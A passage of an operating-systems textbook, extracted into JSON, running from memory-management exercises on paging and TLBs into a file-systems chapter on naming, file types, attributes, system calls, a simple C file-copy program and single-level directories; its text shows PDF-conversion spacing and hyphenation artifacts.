faults.\r\nFr agment A\r\nfor (int j = 0; j < 64; j++)\r\nfor (int i = 0; i < 64; i++) X[i][j] = 0;\r\nFr agment B\r\nfor (int i = 0; i < 64; i++)\r\nfor (int j = 0; j < 64; j++) X[i][j] = 0;\nCHAP. 3 PROBLEMS 259\r\n39. You hav e been hired by a cloud computing company that deploys thousands of servers\r\nat each of its data centers. They hav e recently heard that it would be worthwhile to\r\nhandle a page fault at server A by reading the page from the RAM memory of some\r\nother server rather than its local disk drive.\r\n(a) How could that be done?\r\n(b) Under what conditions would the approach be worthwhile? Be feasible?\r\n40. One of the first timesharing machines, the DEC PDP-1, had a (core) memory of 4K\r\n18-bit words. It held one process at a time in its memory. When the scheduler decided\r\nto run another process, the process in memory was written to a paging drum, with 4K\r\n18-bit words around the circumference of the drum. The drum could start writing (or\r\nreading) at any word, rather than only at word 0. Why do you suppose this drum was\r\nchosen?\r\n41. A computer provides each process with 65,536 bytes of address space divided into\r\npages of 4096 bytes each. A particular program has a text size of 32,768 bytes, a data\r\nsize of 16,386 bytes, and a stack size of 15,870 bytes. Will this program fit in the\r\nmachine’s address space? Suppose that instead of 4096 bytes, the page size were 512\r\nbytes, would it then fit? Each page must contain either text, data, or stack, not a mix\u0002ture of two or three of them.\r\n42. It has been observed that the number of instructions executed between page faults is di\u0002rectly proportional to the number of page frames allocated to a program. If the avail\u0002able memory is doubled, the mean interval between page faults is also doubled. Sup\u0002pose that a normal instruction takes 1 microsec, but if a page fault occurs, it takes 2001\r\nμsec (i.e., 2 msec) to handle the fault. If a program takes 60 sec to run, during which\r\ntime it gets 15,000 page faults, how long would it take to run if twice as much memory\r\nwere available?\r\n43. A group of operating system designers for the Frugal Computer Company are thinking\r\nabout ways to reduce the amount of backing store needed in their new operating sys\u0002tem. The head guru has just suggested not bothering to save the program text in the\r\nswap area at all, but just page it in directly from the binary file whenever it is needed.\r\nUnder what conditions, if any, does this idea work for the program text? Under what\r\nconditions, if any, does it work for the data?\r\n44. A machine-language instruction to load a 32-bit word into a register contains the 32-bit\r\naddress of the word to be loaded. What is the maximum number of page faults this in\u0002struction can cause?\r\n45. Explain the difference between internal fragmentation and external fragmentation.\r\nWhich one occurs in paging systems? Which one occurs in systems using pure seg\u0002mentation?\r\n46. When segmentation and paging are both being used, as in MULTICS, first the segment\r\ndescriptor must be looked up, then the page descriptor. Does the TLB also work this\r\nway, with two lev els of lookup?\r\n47. We consider a program which has the two segments shown below consisting of instruc\u0002tions in segment 0, and read/write data in segment 1. Segment 0 has read/execute pro\u0002tection, and segment 1 has just read/write protection. The memory system is a demand-\n260 MEMORY MANAGEMENT CHAP. 3\r\npaged virtual memory system with virtual addresses that have a 4-bit page number, and\r\na 10-bit offset. The page tables and protection are as follows (all numbers in the table\r\nare in decimal):\r\nSegment 0 Segment 1\r\nRead/Execute Read/Write\r\nVir tual Pa ge # Pag e frame # Vir tual Pa ge # Pag e frame #\r\n0 2 0 On Disk\r\n1 On Disk 1 14\r\n2 11 2 9\r\n3 536\r\n4 On Disk 4 On Disk\r\n5 On Disk 5 13\r\n6 468\r\n7 3 7 12\r\nFor each of the following cases, either give the real (actual) memory address which re\u0002sults from dynamic address translation or identify the type of fault which occurs (either\r\npage or protection fault).\r\n(a) Fetch from segment 1, page 1, offset 3\r\n(b) Store into segment 0, page 0, offset 16\r\n(c) Fetch from segment 1, page 4, offset 28\r\n(d) Jump to location in segment 1, page 3, offset 32\r\n48. Can you think of any situations where supporting virtual memory would be a bad idea,\r\nand what would be gained by not having to support virtual memory? Explain.\r\n49. Virtual memory provides a mechanism for isolating one process from another. What\r\nmemory management difficulties would be involved in allowing two operating systems\r\nto run concurrently? How might these difficulties be addressed?\r\n50. Plot a histogram and calculate the mean and median of the sizes of executable binary\r\nfiles on a computer to which you have access. On a Windows system, look at all .exe\r\nand .dll files; on a UNIX system look at all executable files in /bin, /usr/bin, and\r\n/local/bin that are not scripts (or use the file utility to find all executables). Determine\r\nthe optimal page size for this computer just considering the code (not data). Consider\r\ninternal fragmentation and page table size, making some reasonable assumption about\r\nthe size of a page table entry. Assume that all programs are equally likely to be run and\r\nthus should be weighted equally.\r\n51. Write a program that simulates a paging system using the aging algorithm. The number\r\nof page frames is a parameter. The sequence of page references should be read from a\r\nfile. For a given input file, plot the number of page faults per 1000 memory references\r\nas a function of the number of page frames available.\r\n52. Write a program that simulates a toy paging system that uses the WSClock algorithm.\r\nThe system is a toy in that we will assume there are no write references (not very\nCHAP. 3 PROBLEMS 261\r\nrealistic), and process termination and creation are ignored (eternal life). The inputs\r\nwill be:\r\n• The reclamation age threshhold\r\n• The clock interrupt interval expressed as number of memory references\r\n• A file containing the sequence of page references\r\n(a) Describe the basic data structures and algorithms in your implementation.\r\n(b) Show that your simulation behaves as expected for a simple (but nontrivial) input\r\nexample.\r\n(c) Plot the number of page faults and working set size per 1000 memory references.\r\n(d) Explain what is needed to extend the program to handle a page reference stream\r\nthat also includes writes.\r\n53. Write a program that demonstrates the effect of TLB misses on the effective memory\r\naccess time by measuring the per-access time it takes to stride through a large array.\r\n(a) Explain the main concepts behind the program, and describe what you expect the\r\noutput to show for some practical virtual memory architecture.\r\n(b) Run the program on some computer and explain how well the data fit your expecta\u0002tions.\r\n(c) Repeat part (b) but for an older computer with a different architecture and explain\r\nany major differences in the output.\r\n54. Write a program that will demonstrate the difference between using a local page re\u0002placement policy and a global one for the simple case of two processes. You will need\r\na routine that can generate a page reference string based on a statistical model. This\r\nmodel has N states numbered from 0 to N − 1 representing each of the possible page\r\nreferences and a probability pi associated with each state i representing the chance that\r\nthe next reference is to the same page. Otherwise, the next page reference will be one\r\nof the other pages with equal probability.\r\n(a) Demonstrate that the page reference string-generation routine behaves properly for\r\nsome small N.\r\n(b) Compute the page fault rate for a small example in which there is one process and a\r\nfixed number of page frames. Explain why the behavior is correct.\r\n(c) Repeat part (b) with two processes with independent page reference sequences and\r\ntwice as many page frames as in part (b).\r\n(d) Repeat part (c) but using a global policy instead of a local one. Also, contrast the\r\nper-process page fault rate with that of the local policy approach.\r\n55. Write a program that can be used to compare the effectiveness of adding a tag field to\r\nTLB entries when control is toggled between two programs. The tag field is used to ef\u0002fectively label each entry with the process id. Note that a nontagged TLB can be simu\u0002lated by requiring that all TLB entries have the same tag at any one time. The inputs\r\nwill be:\r\n• The number of TLB entries available\r\n• The clock interrupt interval expressed as number of memory references\r\n• A file containing a sequence of (process, page references) entries\r\n• The cost to update one TLB entry\n262 MEMORY MANAGEMENT CHAP. 3\r\n(a) Describe the basic data structures and algorithms in your implementation.\r\nb) Show that your simulation behaves as expected for a simple (but nontrivial) input\r\nexample.\r\n(c) Plot the number of TLB updates per 1000 references.\n4\r\nFILE SYSTEMS\r\nAll computer applications need to store and retrieve information. While a proc\u0002ess is running, it can store a limited amount of information within its own address\r\nspace. However, the storage capacity is restricted to the size of the virtual address\r\nspace. For some applications this size is adequate, but for others, such as airline\r\nreservations, banking, or corporate record keeping, it is far too small.\r\nA second problem with keeping information within a process’ address space is\r\nthat when the process terminates, the information is lost. For many applications\r\n(e.g., for databases), the information must be retained for weeks, months, or even\r\nforever. Having it vanish when the process using it terminates is unacceptable.\r\nFurthermore, it must not go away when a computer crash kills the process.\r\nA third problem is that it is frequently necessary for multiple processes to ac\u0002cess (parts of) the information at the same time. If we have an online telephone di\u0002rectory stored inside the address space of a single process, only that process can\r\naccess it. The way to solve this problem is to make the information itself indepen\u0002dent of any one process.\r\nThus, we have three essential requirements for long-term information storage:\r\n1. It must be possible to store a very large amount of information.\r\n2. The information must survive the termination of the process using it.\r\n3. Multiple processes must be able to access the information at once.\r\nMagnetic disks have been used for years for this long-term storage. In recent\r\nyears, solid-state drives hav e become increasingly popular, as they do not have any\r\n263"
      }
    }
  },
  "4 FILE SYSTEMS": {
    "page": 294,
    "children": {
      "4.1 FILES": {
        "page": 296,
        "children": {
          "4.1.1 File Naming": {
            "page": 296,
            "content": "4.1.1 File Naming\r\nA file is an abstraction mechanism. It provides a way to store information on\r\nthe disk and read it back later. This must be done in such a way as to shield the\r\nuser from the details of how and where the information is stored, and how the disks\r\nactually work.\r\nProbably the most important characteristic of any abstraction mechanism is the\r\nway the objects being managed are named, so we will start our examination of file\r\nsystems with the subject of file naming. When a process creates a file, it gives the\r\nfile a name. When the process terminates, the file continues to exist and can be ac\u0002cessed by other processes using its name.\r\nThe exact rules for file naming vary somewhat from system to system, but all\r\ncurrent operating systems allow strings of one to eight letters as legal file names.\r\nThus andrea, bruce, and cathy are possible file names. Frequently digits and spe\u0002cial characters are also permitted, so names like 2, urgent!, and Fig.2-14 are often\r\nvalid as well. Many file systems support names as long as 255 characters.\r\nSome file systems distinguish between upper- and lowercase letters, whereas\r\nothers do not. UNIX falls in the first category; the old MS-DOS falls in the sec\u0002ond. (As an aside, while ancient, MS-DOS is still very widely used in embedded\r\nsystems, so it is by no means obsolete.) Thus, a UNIX system can have all of the\r\nfollowing as three distinct files: maria, Maria, and MARIA. In MS-DOS, all these\r\nnames refer to the same file.\r\nAn aside on file systems is probably in order here. Windows 95 and Windows\r\n98 both used the MS-DOS file system, called FAT-16, and thus inherit many of its\r\nproperties, such as how file names are constructed. Windows 98 introduced some\r\nextensions to FAT -16, leading to FAT-32, but these two are quite similar. In addi\u0002tion, Windows NT, Windows 2000, Windows XP, Windows Vista, Windows 7, and\r\nWindows 8 all still support both FAT file systems, which are really obsolete now.\r\nHowever, these newer operating systems also have a much more advanced native\r\nfile system (NTFS) that has different properties (such as file names in Unicode). In\n266 FILE SYSTEMS CHAP. 4\r\nfact, there is second file system for Windows 8, known as ReFS (or Resilient File\r\nSystem), but it is targeted at the server version of Windows 8. In this chapter,\r\nwhen we refer to the MS-DOS or FAT file systems, we mean FAT -16 and FAT -32\r\nas used on Windows unless specified otherwise. We will discuss the FAT file sys\u0002tems later in this chapter and NTFS in Chap. 12, where we will examine Windows\r\n8 in detail. Incidentally, there is also a new FAT -like file system, known as exFAT\r\nfile system, a Microsoft extension to FAT -32 that is optimized for flash drives and\r\nlarge file systems. Exfat is the only modern Microsoft file system that OS X can\r\nboth read and write.\r\nMany operating systems support two-part file names, with the two parts sepa\u0002rated by a period, as in prog.c. The part following the period is called the file\r\nextension and usually indicates something about the file. In MS-DOS, for ex\u0002ample, file names are 1 to 8 characters, plus an optional extension of 1 to 3 charac\u0002ters. In UNIX, the size of the extension, if any, is up to the user, and a file may\r\nev en hav e two or more extensions, as in homepage.html.zip, where .html indicates\r\na Web page in HTML and .zip indicates that the file (homepage.html) has been\r\ncompressed using the zip program. Some of the more common file extensions and\r\ntheir meanings are shown in Fig. 4-1.\r\nExtension Meaning\r\n.bak Backup file\r\n.c C source program\r\n.gif Compuserve Graphical Interchange For mat image\r\n.hlp Help file\r\n.html Wor ld Wide Web HyperText Mar kup Language document\r\n.jpg Still picture encoded with the JPEG standard\r\n.mp3 Music encoded in MPEG layer 3 audio for mat\r\n.mpg Movie encoded with the MPEG standard\r\n.o Object file (compiler output, not yet linked)\r\n.pdf Por table Document For mat file\r\n.ps PostScr ipt file\r\n.tex Input for the TEX for matting program\r\n.txt General text file\r\n.zip Compressed archive\r\nFigure 4-1. Some typical file extensions.\r\nIn some systems (e.g., all flavors of UNIX) file extensions are just conventions\r\nand are not enforced by the operating system. A file named file.txt might be some\r\nkind of text file, but that name is more to remind the owner than to convey any ac\u0002tual information to the computer. On the other hand, a C compiler may actually\nSEC. 4.1 FILES 267\r\ninsist that files it is to compile end in .c, and it may refuse to compile them if they\r\ndo not. However, the operating system does not care.\r\nConventions like this are especially useful when the same program can handle\r\nseveral different kinds of files. The C compiler, for example, can be given a list of\r\nseveral files to compile and link together, some of them C files and some of them\r\nassembly-language files. The extension then becomes essential for the compiler to\r\ntell which are C files, which are assembly files, and which are other files.\r\nIn contrast, Windows is aware of the extensions and assigns meaning to them.\r\nUsers (or processes) can register extensions with the operating system and specify\r\nfor each one which program ‘‘owns’’ that extension. When a user double clicks on\r\na file name, the program assigned to its file extension is launched with the file as\r\nparameter. For example, double clicking on file.docx starts Microsoft Word with\r\nfile.docx as the initial file to edit."
          },
          "4.1.2 File Structure": {
            "page": 298,
            "content": "4.1.2 File Structure\r\nFiles can be structured in any of sev eral ways. Three common possibilities are\r\ndepicted in Fig. 4-2. The file in Fig. 4-2(a) is an unstructured sequence of bytes.\r\nIn effect, the operating system does not know or care what is in the file. All it sees\r\nare bytes. Any meaning must be imposed by user-level programs. Both UNIX and\r\nWindows use this approach.\r\n(a) (b) (c)\r\n1 Record\r\nAnt Fox Pig\r\nCat Cow Dog Goat Lion Owl Pony Rat Worm\r\nHen Ibis Lamb\r\n1 Byte\r\nFigure 4-2. Three kinds of files. (a) Byte sequence. (b) Record sequence.\r\n(c) Tree.\r\nHaving the operating system regard files as nothing more than byte sequences\r\nprovides the maximum amount of flexibility. User programs can put anything they\r\nwant in their files and name them any way that they find convenient. The operating\r\nsystem does not help, but it also does not get in the way. For users who want to do\n268 FILE SYSTEMS CHAP. 4\r\nunusual things, the latter can be very important. All versions of UNIX (including\r\nLinux and OS X) and Windows use this file model.\r\nThe first step up in structure isillustrated in Fig. 4-2(b). In this model, a file is\r\na sequence of fixed-length records, each with some internal structure. Central to\r\nthe idea of a file being a sequence of records is the idea that the read operation re\u0002turns one record and the write operation overwrites or appends one record. As a\r\nhistorical note, in decades gone by, when the 80-column punched card was king of\r\nthe mountain, many (mainframe) operating systems based their file systems on\r\nfiles consisting of 80-character records, in effect, card images. These systems also\r\nsupported files of 132-character records, which were intended for the line printer\r\n(which in those days were big chain printers having 132 columns). Programs read\r\ninput in units of 80 characters and wrote it in units of 132 characters, although the\r\nfinal 52 could be spaces, of course. No current general-purpose system uses this\r\nmodel as its primary file system any more, but back in the days of 80-column\r\npunched cards and 132-character line printer paper this was a common model on\r\nmainframe computers.\r\nThe third kind of file structure is shown in Fig. 4-2(c). In this organization, a\r\nfile consists of a tree of records, not necessarily all the same length, each con\u0002taining a key field in a fixed position in the record. The tree is sorted on the key\r\nfield, to allow rapid searching for a particular key.\r\nThe basic operation here is not to get the ‘‘next’’ record, although that is also\r\npossible, but to get the record with a specific key. For the zoo file of Fig. 4-2(c),\r\none could ask the system to get the record whose key is pony, for example, without\r\nworrying about its exact position in the file. Furthermore, new records can be add\u0002ed to the file, with the operating system, and not the user, deciding where to place\r\nthem. This type of file is clearly quite different from the unstructured byte streams\r\nused in UNIX and Windows and is used on some large mainframe computers for\r\ncommercial data processing."
          },
          "4.1.3 File Types": {
            "page": 299,
            "content": "4.1.3 File Types\r\nMany operating systems support several types of files. UNIX (again, including\r\nOS X) and Windows, for example, have regular files and directories. UNIX also\r\nhas character and block special files. Regular files are the ones that contain user\r\ninformation. All the files of Fig. 4-2 are regular files. Directories are system files\r\nfor maintaining the structure of the file system. We will study directories below.\r\nCharacter special files are related to input/output and used to model serial I/O de\u0002vices, such as terminals, printers, and networks. Block special files are used to\r\nmodel disks. In this chapter we will be primarily interested in regular files.\r\nRegular files are generally either ASCII files or binary files. ASCII files con\u0002sist of lines of text. In some systems each line is terminated by a carriage return\r\ncharacter. In others, the line feed character is used. Some systems (e.g., Windows)\r\nuse both. Lines need not all be of the same length.\nSEC. 4.1 FILES 269\r\nThe great advantage of ASCII files is that they can be displayed and printed as\r\nis, and they can be edited with any text editor. Furthermore, if large numbers of\r\nprograms use ASCII files for input and output, it is easy to connect the output of\r\none program to the input of another, as in shell pipelines. (The interprocess\r\nplumbing is not any easier, but interpreting the information certainly is if a stan\u0002dard convention, such as ASCII, is used for expressing it.)\r\nOther files are binary, which just means that they are not ASCII files. Listing\r\nthem on the printer gives an incomprehensible listing full of random junk. Usually,\r\nthey hav e some internal structure known to programs that use them.\r\nFor example, in Fig. 4-3(a) we see a simple executable binary file taken from\r\nan early version of UNIX. Although technically the file is just a sequence of bytes,\r\nthe operating system will execute a file only if it has the proper format. It has fiv e\r\nsections: header, text, data, relocation bits, and symbol table. The header starts\r\nwith a so-called magic number, identifying the file as an executable file (to pre\u0002vent the accidental execution of a file not in this format). Then come the sizes of\r\nthe various pieces of the file, the address at which execution starts, and some flag\r\nbits. Following the header are the text and data of the program itself. These are\r\nloaded into memory and relocated using the relocation bits. The symbol table is\r\nused for debugging.\r\nOur second example of a binary file is an archive, also from UNIX. It consists\r\nof a collection of library procedures (modules) compiled but not linked. Each one\r\nis prefaced by a header telling its name, creation date, owner, protection code, and\r\nsize. Just as with the executable file, the module headers are full of binary num\u0002bers. Copying them to the printer would produce complete gibberish.\r\nEvery operating system must recognize at least one file type: its own executa\u0002ble file; some recognize more. The old TOPS-20 system (for the DECsystem 20)\r\nwent so far as to examine the creation time of any file to be executed. Then it loca\u0002ted the source file and saw whether the source had been modified since the binary\r\nwas made. If it had been, it automatically recompiled the source. In UNIX terms,\r\nthe make program had been built into the shell. The file extensions were manda\u0002tory, so it could tell which binary program was derived from which source.\r\nHaving strongly typed files like this causes problems whenever the user does\r\nanything that the system designers did not expect. Consider, as an example, a sys\u0002tem in which program output files have extension .dat (data files). If a user writes\r\na program formatter that reads a .c file (C program), transforms it (e.g., by convert\u0002ing it to a standard indentation layout), and then writes the transformed file as out\u0002put, the output file will be of type .dat. If the user tries to offer this to the C compi\u0002ler to compile it, the system will refuse because it has the wrong extension. At\u0002tempts to copy file.dat to file.c will be rejected by the system as invalid (to protect\r\nthe user against mistakes).\r\nWhile this kind of ‘‘user friendliness’’ may help novices, it drives experienced\r\nusers up the wall since they hav e to devote considerable effort to circumventing the\r\noperating system’s idea of what is reasonable and what is not.\n270 FILE SYSTEMS CHAP. 4\r\n(a) (b)\r\nHeader\r\nHeader\r\nHeader\r\nMagic number\r\nText size\r\nData size\r\nBSS size\r\nSymbol table size\r\nEntry point\r\nFlags\r\nText\r\nData\r\nRelocation\r\nbits\r\nSymbol\r\ntable\r\nObject\r\nmodule\r\nObject\r\nmodule\r\nObject\r\nmodule\r\nModule\r\nname\r\nDate\r\nOwner\r\nProtection\r\nSize \r\n\r\nHeader\r\nFigure 4-3. (a) An executable file. (b) An archive."
          },
          "4.1.4 File Access": {
            "page": 301,
            "content": "4.1.4 File Access\r\nEarly operating systems provided only one kind of file access: sequential\r\naccess. In these systems, a process could read all the bytes or records in a file in\r\norder, starting at the beginning, but could not skip around and read them out of\r\norder. Sequential files could be rewound, however, so they could be read as often\r\nas needed. Sequential files were convenient when the storage medium was mag\u0002netic tape rather than disk.\r\nWhen disks came into use for storing files, it became possible to read the bytes\r\nor records of a file out of order, or to access records by key rather than by position.\r\nFiles whose bytes or records can be read in any order are called random-access\r\nfiles. They are required by many applications.\nSEC. 4.1 FILES 271\r\nRandom access files are essential for many applications, for example, database\r\nsystems. If an airline customer calls up and wants to reserve a seat on a particular\r\nflight, the reservation program must be able to access the record for that flight\r\nwithout having to read the records for thousands of other flights first.\r\nTw o methods can be used for specifying where to start reading. In the first\r\none, every read operation gives the position in the file to start reading at. In the\r\nsecond one, a special operation, seek, is provided to set the current position. After\r\na seek, the file can be read sequentially from the now-current position. The latter\r\nmethod is used in UNIX and Windows."
          },
          "4.1.5 File Attributes": {
            "page": 302,
            "content": "4.1.5 File Attributes\r\nEvery file has a name and its data. In addition, all operating systems associate\r\nother information with each file, for example, the date and time the file was last\r\nmodified and the file’s size. We will call these extra items the file’s attributes.\r\nSome people call them metadata. The list of attributes varies considerably from\r\nsystem to system. The table of Fig. 4-4 shows some of the possibilities, but other\r\nones also exist. No existing system has all of these, but each one is present in\r\nsome system.\r\nThe first four attributes relate to the file’s protection and tell who may access it\r\nand who may not. All kinds of schemes are possible, some of which we will study\r\nlater. In some systems the user must present a password to access a file, in which\r\ncase the password must be one of the attributes.\r\nThe flags are bits or short fields that control or enable some specific property.\r\nHidden files, for example, do not appear in listings of all the files. The archive flag\r\nis a bit that keeps track of whether the file has been backed up recently. The back\u0002up program clears it, and the operating system sets it whenever a file is changed.\r\nIn this way, the backup program can tell which files need backing up. The tempo\u0002rary flag allows a file to be marked for automatic deletion when the process that\r\ncreated it terminates.\r\nThe record-length, key-position, and key-length fields are only present in files\r\nwhose records can be looked up using a key. They provide the information required\r\nto find the keys.\r\nThe various times keep track of when the file was created, most recently ac\u0002cessed, and most recently modified. These are useful for a variety of purposes. For\r\nexample, a source file that has been modified after the creation of the correspond\u0002ing object file needs to be recompiled. These fields provide the necessary infor\u0002mation.\r\nThe current size tells how big the file is at present. Some old mainframe oper\u0002ating systems required the maximum size to be specified when the file was created,\r\nin order to let the operating system reserve the maximum amount of storage in ad\u0002vance. Workstation and personal-computer operating systems are thankfully clever\r\nenough to do without this feature nowadays.\n272 FILE SYSTEMS CHAP. 4\r\nAttribute Meaning\r\nProtection Who can access the file and in what way\r\nPassword Password needed to access the file\r\nCreator ID of the person who created the file\r\nOwner Current owner\r\nRead-only flag 0 for read/write; 1 for read only\r\nHidden flag 0 for normal; 1 for do not display in listings\r\nSystem flag 0 for normal files; 1 for system file\r\nArchive flag 0 for has been backed up; 1 for needs to be backed up\r\nASCII/binar y flag 0 for ASCII file; 1 for binary file\r\nRandom access flag 0 for sequential access only; 1 for random access\r\nTemporar y flag 0 for nor mal; 1 for delete file on process exit\r\nLock flags 0 for unlocked; nonzero for locked\r\nRecord length Number of bytes in a record\r\nKe y position Offset of the key within each record\r\nKe y length Number of bytes in the key field\r\nCreation time Date and time the file was created\r\nTime of last access Date and time the file was last accessed\r\nTime of last change Date and time the file was last changed\r\nCurrent size Number of bytes in the file\r\nMaximum size Number of bytes the file may grow to\r\nFigure 4-4. Some possible file attributes."
          },
          "4.1.6 File Operations": {
            "page": 303,
            "content": "4.1.6 File Operations\r\nFiles exist to store information and allow it to be retrieved later. Different sys\u0002tems provide different operations to allow storage and retrieval. Below is a dis\u0002cussion of the most common system calls relating to files.\r\n1. Create. The file is created with no data. The purpose of the call is to\r\nannounce that the file is coming and to set some of the attributes.\r\n2. Delete. When the file is no longer needed, it has to be deleted to free\r\nup disk space. There is always a system call for this purpose.\r\n3. Open. Before using a file, a process must open it. The purpose of the\r\nopen call is to allow the system to fetch the attributes and list of disk\r\naddresses into main memory for rapid access on later calls.\r\n4. Close. When all the accesses are finished, the attributes and disk ad\u0002dresses are no longer needed, so the file should be closed to free up\r\ninternal table space. Many systems encourage this by imposing a\nSEC. 4.1 FILES 273\r\nmaximum number of open files on processes. A disk is written in\r\nblocks, and closing a file forces writing of the file’s last block, even\r\nthough that block may not be entirely full yet.\r\n5. Read. Data are read from file. Usually, the bytes come from the cur\u0002rent position. The caller must specify how many data are needed and\r\nmust also provide a buffer to put them in.\r\n6. Wr ite. Data are written to the file again, usually at the current posi\u0002tion. If the current position is the end of the file, the file’s size in\u0002creases. If the current position is in the middle of the file, existing\r\ndata are overwritten and lost forever.\r\n7. Append. This call is a restricted form of wr ite. It can add data only to\r\nthe end of the file. Systems that provide a minimal set of system calls\r\nrarely have append, but many systems provide multiple ways of\r\ndoing the same thing, and these systems sometimes have append.\r\n8. Seek. For random-access files, a method is needed to specify from\r\nwhere to take the data. One common approach is a system call, seek,\r\nthat repositions the file pointer to a specific place in the file. After this\r\ncall has completed, data can be read from, or written to, that position.\r\n9. Get attributes. Processes often need to read file attributes to do their\r\nwork. For example, the UNIX make program is commonly used to\r\nmanage software development projects consisting of many source\r\nfiles. When make is called, it examines the modification times of all\r\nthe source and object files and arranges for the minimum number of\r\ncompilations required to bring everything up to date. To do its job, it\r\nmust look at the attributes, namely, the modification times.\r\n10. Set attributes. Some of the attributes are user settable and can be\r\nchanged after the file has been created. This system call makes that\r\npossible. The protection-mode information is an obvious example.\r\nMost of the flags also fall in this category.\r\n11. Rename. It frequently happens that a user needs to change the name\r\nof an existing file. This system call makes that possible. It is not al\u0002ways strictly necessary, because the file can usually be copied to a\r\nnew file with the new name, and the old file then deleted."
          },
          "4.1.7 An Example Program Using File-System Calls": {
            "page": 304,
            "content": "4.1.7 An Example Program Using File-System Calls\r\nIn this section we will examine a simple UNIX program that copies one file\r\nfrom its source file to a destination file. It is listed in Fig. 4-5. The program has\r\nminimal functionality and even worse error reporting, but it gives a reasonable idea\r\nof how some of the system calls related to files work.\n274 FILE SYSTEMS CHAP. 4\r\n/\r\n* File copy program. Error checking and reporting is minimal. */\r\n#include <sys/types.h> /* include necessary header files */\r\n#include <fcntl.h>\r\n#include <stdlib.h>\r\n#include <unistd.h>\r\nint main(int argc, char *argv[]); /* ANSI prototype */\r\n#define BUF SIZE 4096 /* use a buffer size of 4096 bytes */\r\n#define OUTPUT MODE 0700 /* protection bits for output file */\r\nint main(int argc, char *argv[])\r\n{\r\nint in fd, out fd, rd count, wt count;\r\nchar buffer[BUF SIZE];\r\nif (argc != 3) exit(1); /* syntax error if argc is not 3 */\r\n/\r\n* Open the input file and create the output file */\r\nin fd = open(argv[1], O RDONLY); /* open the source file */\r\nif (in fd < 0) exit(2); /* if it cannot be opened, exit */\r\nout fd = creat(argv[2], OUTPUT MODE); /* create the destination file */\r\nif (out fd < 0) exit(3); /* if it cannot be created, exit */\r\n/\r\n* Copy loop */\r\nwhile (TRUE) {\r\nrd count = read(in fd, buffer, BUF SIZE); /* read a block of data */\r\nif (rd count <= 0) break; /* if end of file or error, exit loop */\r\nwt count = write(out fd, buffer, rd count); /* wr ite data */\r\nif (wt count <= 0) exit(4); /* wt count <= 0 is an error */\r\n}\r\n/\r\n* Close the files */\r\nclose(in fd);\r\nclose(out fd);\r\nif (rd count == 0) /* no error on last read */\r\nexit(0);\r\nelse\r\nexit(5); /* error on last read */\r\n}\r\nFigure 4-5. A simple program to copy a file.\r\nThe program, copyfile, can be called, for example, by the command line\r\ncopyfile abc xyz\r\nto copy the file abc to xyz. If xyz already exists, it will be overwritten. Otherwise,\r\nit will be created. The program must be called with exactly two arguments, both\r\nlegal file names. The first is the source; the second is the output file.\nSEC. 4.1 FILES 275\r\nThe four #include statements near the top of the program cause a large number\r\nof definitions and function prototypes to be included in the program. These are\r\nneeded to make the program conformant to the relevant international standards, but\r\nwill not concern us further. The next line is a function prototype for main, some\u0002thing required by ANSI C, but also not important for our purposes.\r\nThe first #define statement is a macro definition that defines the character\r\nstring BUF SIZE as a macro that expands into the number 4096. The program\r\nwill read and write in chunks of 4096 bytes. It is considered good programming\r\npractice to give names to constants like this and to use the names instead of the\r\nconstants. Not only does this convention make programs easier to read, but it also\r\nmakes them easier to maintain. The second #define statement determines who can\r\naccess the output file.\r\nThe main program is called main, and it has two arguments, argc, and argv.\r\nThese are supplied by the operating system when the program is called. The first\r\none tells how many strings were present on the command line that invoked the pro\u0002gram, including the program name. It should be 3. The second one is an array of\r\npointers to the arguments. In the example call given above, the elements of this\r\narray would contain pointers to the following values:\r\nargv[0] = \"copyfile\"\r\nargv[1] = \"abc\"\r\nargv[2] = \"xyz\"\r\nIt is via this array that the program accesses its arguments.\r\nFive variables are declared. The first two, in fd and out fd, will hold the file\r\ndescriptors, small integers returned when a file is opened. The next two, rd count\r\nand wt count, are the byte counts returned by the read and wr ite system calls, re\u0002spectively. The last one, buffer, is the buffer used to hold the data read and supply\r\nthe data to be written.\r\nThe first actual statement checks argc to see if it is 3. If not, it exits with status\r\ncode 1. Any status code other than 0 means that an error has occurred. The status\r\ncode is the only error reporting present in this program. A production version\r\nwould normally print error messages as well.\r\nThen we try to open the source file and create the destination file. If the source\r\nfile is successfully opened, the system assigns a small integer to in fd, to identify\r\nthe file. Subsequent calls must include this integer so that the system knows which\r\nfile it wants. Similarly, if the destination is successfully created, out fd is given a\r\nvalue to identify it. The second argument to creat sets the protection mode. If ei\u0002ther the open or the create fails, the corresponding file descriptor is set to −1, and\r\nthe program exits with an error code.\r\nNow comes the copy loop. It starts by trying to read in 4 KB of data to buffer.\r\nIt does this by calling the library procedure read, which actually invokes the read\r\nsystem call. The first parameter identifies the file, the second gives the buffer, and\r\nthe third tells how many bytes to read. The value assigned to rd count gives the\n276 FILE SYSTEMS CHAP. 4\r\nnumber of bytes actually read. Normally, this will be 4096, except if fewer bytes\r\nare remaining in the file. When the end of the file has been reached, it will be 0. If\r\nrd count is ever zero or negative, the copying cannot continue, so the break state\u0002ment is executed to terminate the (otherwise endless) loop.\r\nThe call to write outputs the buffer to the destination file. The first parameter\r\nidentifies the file, the second gives the buffer, and the third tells how many bytes to\r\nwrite, analogous to read. Note that the byte count is the number of bytes actually\r\nread, not BUF SIZE. This point is important because the last read will not return\r\n4096 unless the file just happens to be a multiple of 4 KB.\r\nWhen the entire file has been processed, the first call beyond the end of file\r\nwill return 0 to rd count, which will make it exit the loop. At this point the two\r\nfiles are closed and the program exits with a status indicating normal termination.\r\nAlthough the Windows system calls are different from those of UNIX, the gen\u0002eral structure of a command-line Windows program to copy a file is moderately\r\nsimilar to that of Fig. 4-5. We will examine the Windows 8 calls in Chap. 11."
          }
        }
      },
      "4.2 DIRECTORIES": {
        "page": 307,
        "children": {
          "4.2.1 Single-Level Directory Systems": {
            "page": 307,
            "content": "4.2.1 Single-Level Directory Systems\r\nThe simplest form of directory system is having one directory containing all\r\nthe files. Sometimes it is called the root directory, but since it is the only one, the\r\nname does not matter much. On early personal computers, this system was com\u0002mon, in part because there was only one user. Interestingly enough, the world’s\r\nfirst supercomputer, the CDC 6600, also had only a single directory for all files,\r\nev en though it was used by many users at once. This decision was no doubt made\r\nto keep the software design simple.\r\nAn example of a system with one directory is given in Fig. 4-6. Here the di\u0002rectory contains four files. The advantages of this scheme are its simplicity and the\r\nability to locate files quickly—there is only one place to look, after all. It is some\u0002times still used on simple embedded devices such as digital cameras and some\r\nportable music players."
          },
          "4.2.2 Hierarchical Directory Systems": {
            "page": 307,
